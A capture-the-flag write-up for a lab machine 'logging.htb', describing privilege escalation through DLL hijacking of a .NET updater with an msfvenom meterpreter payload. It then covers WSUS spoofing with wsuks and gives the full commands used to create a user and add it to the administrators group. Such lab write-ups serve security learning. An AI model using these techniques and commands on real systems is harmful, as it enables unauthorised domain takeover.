cat foothold

Once the shell is opened, I find a file called monitor.ps1 in the Documents folder. After reading it I discover it is used to check the status of a job running on the system.

By leveraging the information in this script I manage to retrieve the job details:

Through this path I retrieve a .NET executable (the file format is indicated in the configuration file bundled with the exe) that can be decompiled and may provide relevant information.

To decompile this executable I use, on Windows, a tool called ilspy.

The decompilation reveals that the main method of this program checks the path C:\ProgramData\UpdateMonitor\Settings_Update.zip and, if the file exists, extracts its contents into the bin folder of the original software. The extracted file must be named settings_update.dll and is loaded at software startup (i.e., every time the job is executed).

This behavior allows us to create a malicious DLL with msfvenom and load a zip capable of opening a meterpreter shell. This type of attack is known as DLL Hijacking and consists of replacing a legitimate DLL with one containing malicious code injected by the attacker. The DLL must be compiled with the same architecture as the running software. The file command on the exe reveals it was compiled for 32-bit, so the msfvenom payload must also target 32-bit.

After some research I discover that WSUS is the Windows Update manager. This ticket also provides other very interesting details, such as the DNS not working issue and the task that every 120 seconds calls wsus.logging.htb.

These are all the prerequisites for a WSUS spoofing attack. Here is how it works:

  1. The Domain Controller is convinced that the WSUS is a server under our control.
  2. A fake WSUS is actually set up to receive requests.
  3. This fake WSUS allows forcing the DC to execute commands.

I then copied the certificate into the cert.pem file and restarted wsuks. In this case the exploit did not work correctly out of the box. The default wsuks payload correctly created the user but did not add it to the local Admins group. I modify the payload as follows (running two iterations):

sudo wsuks -I tun0 --serve-only --WSUS-Port 8531 --tls-cert cert.pem --command "/accepteula /s cmd.exe /c net user k0d14k Password123! /add"
sudo wsuks -I tun0 --serve-only --WSUS-Port 8531 --tls-cert cert.pem --command "/accepteula /s cmd.exe /c net localgroup administrators logging.htb\k0d14k /add"

This way we added a new user and added it to the local administrators group, effectively becoming Domain Administrators.
